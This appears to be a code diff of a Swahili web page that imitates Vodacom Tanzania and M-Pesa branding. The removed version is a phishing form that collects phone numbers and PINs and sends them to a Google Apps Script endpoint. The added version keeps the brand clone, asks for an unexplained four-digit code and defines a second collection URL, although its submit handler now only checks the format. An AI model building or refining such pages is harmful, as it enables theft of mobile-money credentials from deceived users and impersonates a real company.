@@ -1,108 +1,293 @@
 <!DOCTYPE html>
 <html lang="sw">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vodacom Promotion</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 40px 20px;
-            background: #E60000; /* Vodacom Red */
-            color: white;
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .container {
-            max-width: 420px;
-            width: 100%;
-            background: white;
-            padding: 40px 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            color: #333;
-        }
-        h2 { font-size: 24px; margin-bottom: 15px; color: #E60000; }
-        p { line-height: 1.6; margin-bottom: 25px; font-size: 15px; color: #555; }
-        input {
-            width: 100%; padding: 14px; margin: 10px 0; font-size: 16px;
-            border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; transition: border 0.3s;
-        }
-        input:focus { outline: none; border: 2px solid #E60000; }
-        button {
-            padding: 16px; width: 100%; background: #E60000; color: white;
-            border: none; border-radius: 8px; font-size: 18px; font-weight: bold;
-            cursor: pointer; margin-top: 15px; transition: background 0.3s;
-        }
-        button:hover { background: #b30000; }
-        button:disabled { background: #999; cursor: not-allowed; }
-        #message { margin-top: 20px; font-weight: bold; font-size: 16px; color: #E60000; min-height: 24px; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vodacom Tanzania | M-Pesa</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 35px 16px;
+      margin: 0;
+      min-height: 100vh;
+      background: linear-gradient(
+        to bottom,
+        #e60000 0%,
+        #b80000 35%,
+        #f5f5f5 35%,
+        #f5f5f5 100%
+      );
+      color: #222;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 32px 25px;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.2);
+    }
+
+    .brand {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 18px;
+    }
+
+    .brand-symbol {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 52px;
+      height: 52px;
+      background: #e60000;
+      color: #fff;
+      font-size: 25px;
+      font-weight: bold;
+      border-radius: 50%;
+      border: 3px solid #f4cccc;
+    }
+
+    .brand-name {
+      color: #e60000;
+      font-size: 27px;
+      font-weight: bold;
+    }
+
+    .brand-name small {
+      display: block;
+      font-size: 12px;
+      color: #555;
+      font-weight: normal;
+      text-align: left;
+    }
+
+    .mpesa {
+      display: inline-block;
+      background: #00843d;
+      color: white;
+      padding: 7px 18px;
+      border-radius: 6px;
+      font-weight: bold;
+      margin-bottom: 12px;
+    }
+
+    h2 {
+      font-size: 23px;
+      color: #e60000;
+      margin: 12px 0 18px;
+    }
+
+    p {
+      line-height: 1.6;
+      margin-bottom: 18px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      font-size: 17px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background: #fff;
+      color: #222;
+    }
+
+    input:focus {
+      outline: 2px solid #e60000;
+      border-color: #e60000;
+    }
+
+    button {
+      padding: 15px;
+      width: 100%;
+      background: #e60000;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 12px;
+    }
+
+    button:hover {
+      background: #bd0000;
+    }
+
+    #message {
+      margin-top: 18px;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .info-message {
+      background: #f2f2f2;
+      color: #333;
+    }
+
+    .error-message {
+      background: #fff0f0;
+      color: #b00000;
+    }
+
+    .success-message {
+      background: #e9f7ef;
+      color: #176b37;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 22px;
+    }
+
+    #celebrationOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,.8);
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      z-index: 1000;
+    }
+
+    #celebrationPopup {
+      background: white;
+      padding: 30px;
+      border-radius: 16px;
+      max-width: 380px;
+      width: 100%;
+      border-top: 6px solid #e60000;
+    }
+
+    #celebrationPopup h1 {
+      color: #e60000;
+      margin-top: 0;
+    }
+
+    #closePopup {
+      background: #e60000;
+    }
+  </style>
 </head>
+
 <body>
+  <main class="container">
 
-    <div class="container">
-        <h2>Karibu Vodacom</h2>
-        <p>Jisajili hapa kupokea habari na ofa mpya kutoka Vodacom.</p>
-
-        <form id="safeForm">
-            <!-- Tumeongeza name="" hapa ili script iweze kusoma -->
-            <input type="tel" id="phoneNumber" name="Phone Number" placeholder="Nambari ya Simu" pattern="[0-9]{9,12}" title="Tafadhali ingiza namba sahihi" required>
-            <input type="neno ya siri" id="neno ya siri" name="neno ya siri" placeholder=" neno ya siri (PIN)" >
-            <button type="submit" id="submitBtn">JISAJILI</button>
-        </form>
-
-        <div id="message"></div>
+    <div class="brand">
+      <div class="brand-symbol" aria-hidden="true">V</div>
+      <div class="brand-name">
+        vodacom
+        <small>Tanzania</small>
+      </div>
     </div>
 
-    <script>
-        
-            // Google Apps Script Web App URL - REPLACE WITH YOUR DEPLOYED URL
-            const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwky6VAmvB-7BSQIa9RaubC_gHLwSwfCn7VxZf0yG3Fi2u911sKpWDKJUB-KZidjgkbRw/exec";
-            // Handle form submission
-            async function handleSubmit(event) {
-                event.preventDefault(); // Prevent default form submission
+    <br>
 
-        const form = document.getElementById('safeForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const messageDiv = document.getElementById('message');
+    <div class="mpesa">M-PESA</div>
 
-        form.addEventListener('submit', async (event) => {
-            event.preventDefault(); // Zuia fomu isirudie kupakia ukurasa
+    <h2>Karibu Vodacom Tanzania</h2>
 
-            // Badilisha kitufe kuwa kwenye hali ya kusubiri
-            submitBtn.innerText = "Inatuma...";
-            submitBtn.disabled = true;
-            messageDiv.innerText = "";
+    <p>Ingiza namba yako ya Vodacom ili kuendelea.</p>
 
-            // Kusanya data kutoka kwenye fomu
-            const formData = new URLSearchParams(new FormData(form));
+    <form id="offerForm">
+      <input
+        type="tel"
+        id="phoneNumber"
+        placeholder="Namba ya simu (07XXXXXXXX)"
+        aria-label="Namba ya simu"
+        pattern="0[0-9]{9}"
+        maxlength="10"
+        inputmode="numeric"
+        autocomplete="tel"
+        required
+        title="Ingiza namba ya simu yenye tarakimu 10, ikianza na 0"
+      >
+<input
+  type="text"
+  id="fourDigits"
+  placeholder="Enter 4 digits"
+  inputmode="numeric"
+  maxlength="4"
+  pattern="[0-9]{4}"
+  required
+  oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)"
+>
+      <button type="submit">ENDELEA</button>
+    </form>
 
-            try {
-                // Tuma data kwenda Google Sheet
-                await fetch(APPS_SCRIPT_URL, {
-                    method: 'POST',
-                    mode: 'no-cors', // Hii inazuia browser kuzuia data kutokana na CORS
-                    body: formData
-                });
+    <div
+      id="message"
+      class="info-message"
+      role="status"
+      aria-live="polite"
+    >
+      Ingiza namba yako ya simu ili kuendelea.
+    </div>
 
-                // Onyesha ujumbe wa mafanikio
-                messageDiv.innerText = "Asante! Nambari yako imepokelewa kikamilifu.";
-                form.reset(); // Futa data kwenye fomu
+    <p class="footer">
+    Si tovuti rasmi ya Vodacom
+    </p>
 
-            } catch (error) {
-                console.error('Error:', error);
-                messageDiv.innerText = "Kuna tatizo limetokea. Tafadhali jaribu tena.";
-            } finally {
-                // Rudisha kitufe kwenye hali ya kawaida
-                submitBtn.innerText = "JISAJILI";
-                submitBtn.disabled = false;
-            }
-        });
-    </script>
+  </main>
+
+  <div
+    id="celebrationOverlay"
+    role="dialog"
+    aria-modal="true"
+    aria-labelledby="popupTitle"
+  >
+    <div id="celebrationPopup">
+      <h1 id="popupTitle">Asante!</h1>
+      <p>Namba imekaguliwa kwa muundo pekee.</p>
+      <button type="button" id="closePopup">Funga</button>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('offerForm');
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx4-kBEkb3dLUBFD5baH0_e22TzS6wwAjPLBR9GgjM_sGflg1LLgAfoe-h0iWU_-ZMB-A/exec";
+    const phoneInput = document.getElementById('phoneNumber');
+    const message = document.getElementById('message');
+    const overlay = document.getElementById('celebrationOverlay');
+    const closePopup = document.getElementById('closePopup');
+
+    form.addEventListener('submit', function (event) {
+      event.preventDefault();
+
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+
+      message.textContent =
+        'Namba imekaguliwa kwa muundo pekee.';
+      message.className = 'success-message';
+
+      overlay.style.display = 'flex';
+      closePopup.focus();
+    });
+
+    closePopup.addEventListener('click', function () {
+      overlay.style.display = 'none';
+      phoneInput.focus();
+    });
+
+    phoneInput.addEventListener('input', function () {
+      message.textContent = '';
+      message.className = '';
+    });
+  </script>
 </body>
 </html>
